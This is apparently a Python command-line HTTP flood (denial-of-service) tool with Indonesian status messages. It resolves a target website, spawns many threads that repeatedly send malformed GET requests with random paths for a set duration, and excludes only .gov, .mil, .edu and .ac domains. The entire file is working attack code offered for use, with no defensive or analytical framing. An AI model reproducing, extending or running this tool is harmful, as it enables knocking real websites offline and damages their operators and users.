# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore, init
    init()
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

# GLOBAL VARIABLES
stop_attack = threading.Event()
attack_running = False

# DEF & CLASS
def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
    if stop_attack.is_set():
        return
    url_path = ''
    path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
    path_get_loader = random.choice(path_get)
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
        s.connect((ip, port))
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            s.send(packet_data)
    except:
        pass
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
    while time.time() < time_loader and not stop_attack.is_set():
        threads = []
        for _ in range(min(spam_loader, 10)):
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
            threads.append(th)
            th.start()
        
        for th in threads:
            th.join(timeout=0.1)

def countdown_timer(time_loader):
    global attack_running
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)
        remaining = int(time_loader - time.time())
    
    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
    attack_running = False

def stop_attack_handler():
    global attack_running
    while attack_running:
        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            input()
            stop_attack.set()
            print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")
            attack_running = False
            break
        time.sleep(0.1)

def confirm_exit():
    while True:
        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
        sys.stdout.flush()
        choice = input().lower()
        if choice == 'y':
            print(f"\n{Fore.RED}Program terminated by user (Enter). Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

def command():
    global stop_attack, attack_running
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                confirm_exit()
                continue
                
            args_get = data_input_loader.split(" ")
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 10:
                    data_type_loader_packet = args_get[1].upper()
                    target_loader = args_get[2]
                    port_loader = int(args_get[3])
                    time_loader = time.time() + int(args_get[4])
                    spam_loader = int(args_get[5])
                    create_thread = min(int(args_get[6]), 10)
                    booter_sent = int(args_get[7])
                    methods_loader = args_get[8]
                    spam_create_thread = min(int(args_get[9]), 10)
                    code_leak = True
                    host = ''
                    ip = ''
                    
                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
                            code_leak = False
                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                        else:
                            ip = socket.gethostbyname(host)
                            code_leak = True
                    except socket.gaierror:
                        code_leak = False
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                    
                    if code_leak:
                        stop_attack.clear()
                        attack_running = True
                        print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\n{Fore.RESET}")
                        
                        # Start attack threads
                        attack_threads = []
                        for _ in range(create_thread):
                            th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet))
                            attack_threads.append(th)
                            th.start()
                        
                        # Start countdown and stop handler
                        threading.Thread(target=countdown_timer, args=(time_loader,)).start()
                        threading.Thread(target=stop_attack_handler).start()
                        
                        # Wait for attack to complete
                        for th in attack_threads:
                            th.join(timeout=0.1)
                            
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
                    print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Fore.RESET}")

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
